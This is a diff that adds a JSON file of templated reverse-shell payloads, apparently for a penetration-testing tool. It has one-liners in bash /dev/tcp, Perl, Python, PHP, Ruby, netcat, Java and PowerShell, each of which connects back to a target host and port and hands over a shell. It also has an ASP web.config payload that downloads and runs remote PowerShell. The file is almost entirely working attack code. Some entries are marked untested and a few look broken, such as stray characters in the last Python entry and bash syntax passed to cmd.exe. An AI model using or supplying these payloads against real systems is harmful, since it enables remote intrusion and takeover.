@@ -1,0 +1,102 @@
+[
+  {
+    "name": "Linux /dev/tcp",
+    "description": "Tested on Ubuntu, this one is pretty slick.  On some systems the /dev/tcp device is not shown in a directory list, but it is there.",
+    "code": "bash -i >& /dev/tcp/${target}/${port} 0>&1"
+  },
+  {
+    "name": "Linux /dev/tcp 2",
+    "description": "Tested on Ubuntu.",
+    "code": "exec 5<>/dev/tcp/${target}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done"
+  },
+  {
+    "name": "Linux PERL 1",
+    "description": "Using PERL tested on Ubuntu",
+    "code": "perl -e 'use Socket;\n$i=\"${target}\";\n$p=${port};\nsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\nif(connect(S,sockaddr_in($p,inet_aton($i))))\n{\n  open(STDIN,\">&S\");\n  open(STDOUT,\">&S\");\n  open(STDERR,\">&S\");\n  exec(\"/bin/sh -i\");\n};'"
+  },
+  {
+    "name": "Windows PERL 1",
+    "description": "Same as the Linux PERL 1 but for Windows.",
+    "code": "perl -e 'use Socket;\n$i=\"${target}\";\n$p=${port};\nsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\nif(connect(S,sockaddr_in($p,inet_aton($i))))\n{\n  open(STDIN,\">&S\");\n  open(STDOUT,\">&S\");\n  open(STDERR,\">&S\");\n  exec(\"cmd.exe -i\");\n};'"
+  },
+  {
+    "name": "Linux Python 1",
+    "description": "Simple Python shell.",
+    "code": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${target}', '${port}'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+  },
+  {
+    "name": "Windows Python 1",
+    "description": "Python 1 for Windows (NOT TESTED)",
+    "code": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${target}', '${port}'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"cmd.exe\",\"-i\"]);'"
+  },
+  {
+    "name": "Linux Python Upgrade",
+    "description": "Not a reverse shell, but used to upgrade existing local shell.",
+    "code": "python -c 'import pty;pty.spawn(\"/bin/bash\")'"
+  },
+  {
+    "name": "Windows Python Upgrade",
+    "description": "Not a reverse shell, but used to upgrade existing local shell. (NOT TESTED)",
+    "code": "python -c 'import pty;pty.spawn(\"cmd.exe\")'"
+  },
+  {
+    "name": "Linux PHP 1",
+    "description": "Simple PHP shell for Linux",
+    "code": "php -r '$sock=fsockopen(\"${target}\",${port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+  },
+  {
+    "name": "Windows PHP 1",
+    "description": "PHP for Windows (NOT TESTED)",
+    "code": "php -r '$sock=fsockopen(\"${target}\",${port});exec(\"cmd.exe -i <&3 >&3 2>&3\");'"
+  },
+  {
+    "name": "Linux Ruby",
+    "description": "",
+    "code": "ruby -rsocket -e 'f=TCPSocket.open(\"${target}\",${port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+  },
+  {
+    "name": "Windows Ruby",
+    "description": "Not tested.",
+    "code": "ruby -rsocket -e 'f=TCPSocket.open(\"${target}\",${port}).to_i;exec sprintf(\"cmd.exe -i <&%d >&%d 2>&%d\",f,f,f)'"
+  },
+  {
+    "name": "Linux Netcat",
+    "description": "Simple nc shell for Linux",
+    "code": "nc -e /bin/sh ${target} ${port}"
+  },
+  {
+    "name": "Windows Netcat",
+    "description": "Simple nc for windows",
+    "code": "nc -e cmd.exe ${target} ${port}"
+  },
+  {
+    "name": "Linux Netcat 2",
+    "description": "Pipe IO from /tmp/f to NC, needs some more tweaking.",
+    "code": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${target} ${port} >/tmp/f"
+  },
+  {
+    "name": "Linux Java",
+    "description": "Simple Java shell for Linux",
+    "code": "class helloworld {\n  public static void main(String[] args) {\n    try {\n      String[] cmdArry = new String[3];\n      cmdArry[0] = \"/bin/bash\";\n      cmdArry[1] = \"-c\";\n      cmdArry[2] = \"exec 5<>/dev/tcp/${target}/${port} cat <&5 | while read line; do $line 2>&5 >&5; done\";\n      Process p = Runtime.getRuntime().exec(cmdArry);\n      p.waitFor();\n    } catch(Exception ex) {\n      ex.printStackTrace();\n    }\n  }\n}"
+  },
+  {
+    "name": "Windows Java",
+    "description": "Not tested yet.",
+    "code": "class helloworld {\n  public static void main(String[] args) {\n    try {\n      String[] cmdArry = new String[3];\n      cmdArry[0] = \"cmd.exe\";\n      cmdArry[1] = \"-c\";\n      cmdArry[2] = \"exec 5<>/dev/tcp/${target}/${port} cat <&5 | while read line; do $line 2>&5 >&5; done\";\n      Process p = Runtime.getRuntime().exec(cmdArry);\n      p.waitFor();\n    } catch(Exception ex) {\n      ex.printStackTrace();\n    }\n  }\n}"
+  },
+  {
+    "name": "Powershell 1",
+    "description": "Powershell one liner (NOT TESTED)",
+    "code": "$client = New-Object System.Net.Sockets.TCPClient(\"${target}\", ${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+  },
+  {
+    "name": "Web.config",
+    "description": "Web.config that downloads a remote file (HackTheBox - Bounty)",
+    "code": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n\t<system.webServer>\n\t\t<handlers accessPolicy=\"Read, Script, Write\">\n\t\t\t<add name=\"web_config\" path=\"*.config\" verb=\"*\" modules=\"IsapiModule\" scriptProcessor=\"%windir%\\system32\\inetsrv\\asp.dll\" resourceType=\"Unspecified\" requireAccess=\"Write\" preCondition=\"bitness64\" />\n\t\t</handlers>\n\t\t<security>\n\t\t\t<requestFiltering>\n\t\t\t<fileExtensions>\n\t\t\t\t<remove fileExtension=\".config\" />\n\t\t\t</fileExtensions>\n\t\t\t<hiddenSegments>\n\t\t\t\t<remove segment=\"web.config\" />\n\t\t\t</hiddenSegments>\n\t\t\t</requestFiltering>\n\t\t</security>\n\t</system.webServer>\n</configuration>\n<%\nSet s = CreateObject(\"WScript.Shell\")\nSet cmd = s.Exec(\"cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://${target}:${port}/file.ps1')\")\no = cmd.StdOut.Readall()\nResponse.write(o)\n%>"
+  },
+  {
+    "name": "Linux Python 2",
+    "description": "Escaping limited interpreters using Python.",
+    "code": "import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((${target}, ${port}))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),   *$ 1)\nos.dup2(s.fileno(),2)\np=subprocess.call([\"/bin/sh\",\"-i\"])"
+  }
+]
